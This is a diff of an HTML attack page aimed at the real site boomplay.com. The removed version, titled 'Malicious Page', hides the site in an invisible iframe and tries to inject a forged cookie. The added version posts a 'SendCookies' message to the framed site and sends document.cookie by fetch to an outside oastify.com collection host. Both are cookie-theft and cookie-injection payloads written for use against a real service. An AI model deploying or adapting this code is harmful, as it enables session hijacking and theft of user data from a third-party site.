@@ -1,33 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Malicious Page</title>
-    <script>
-        // Ensure the script runs when the page is fully loaded
-        window.onload = function() {
-            // Create an iframe to load the target site
-            let iframe = document.createElement('iframe');
-            iframe.src = "https://boomplay.com/userCenter/profile";
-            iframe.style.width = "0";
-            iframe.style.height = "0";
-            iframe.style.border = "none";
-            document.body.appendChild(iframe);
-
-            // Wait for the iframe to load before manipulating cookies
-            iframe.onload = function() {
-                try {
-                    // Set a malicious cookie for the target site
-                    iframe.contentWindow.document.cookie = "userName=hahaha; path=/; domain=boomplay.com";
-                    console.log("Cookie injected successfully!");
-                } catch (error) {
-                    console.error("Failed to inject cookie: ", error);
-                }
-            };
-        };
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe with Cookies</title>
 </head>
 <body>
-    <h1>Welcome to My Site</h1>
-    <p>This is just a harmless page, don't mind me!</p>
+    <h1>Iframe Example</h1>
+
+    <!-- Create the iframe dynamically -->
+    <script>
+        // Create the iframe element
+        const iframe = document.createElement('iframe');
+        
+        // Set the sandbox attributes for the iframe
+        iframe.sandbox.add('allow-scripts');
+        iframe.sandbox.add('allow-same-origin');
+        
+        // Set the source URL for the iframe (replace with your desired URL)
+        iframe.src = 'https://boomplay.com'; // External source
+        
+        // Set the iframe dimensions
+        iframe.width = '800';
+        iframe.height = '600';
+        
+        // Append iframe to the body
+        document.body.appendChild(iframe);
+
+        // Log iframe creation
+        console.log('Iframe created with sandbox attributes: allow-scripts, allow-same-origin');
+
+        // Listen for messages from the iframe
+        window.addEventListener('message', (event) => {
+            // Ensure the message is from a trusted source (the iframe)
+            if (event.origin !== 'https://boomplay.com') {
+                console.log('Message from untrusted origin:', event.origin);
+                return;
+            }
+
+            // Assuming cookies or any data is sent from the iframe, send it to your external server
+            if (event.data === 'SendCookies') {
+                const iframeCookies = document.cookie; // Example cookies from the parent window
+
+                // Send the cookies to the external server (e.g., nb2ud7etp70klpz0ksogmknrjip9d01p.oastify.com)
+                fetch('https://nb2ud7etp70klpz0ksogmknrjip9d01p.oastify.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cookies: iframeCookies,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => console.log('Cookies sent to external server:', data))
+                .catch(error => console.error('Error sending cookies:', error));
+            }
+        });
+
+        // After the iframe loads, send a message to it requesting cookies
+        iframe.onload = function() {
+            iframe.contentWindow.postMessage('SendCookies', 'https://boomplay.com');
+        };
+    </script>
 </body>
 </html>
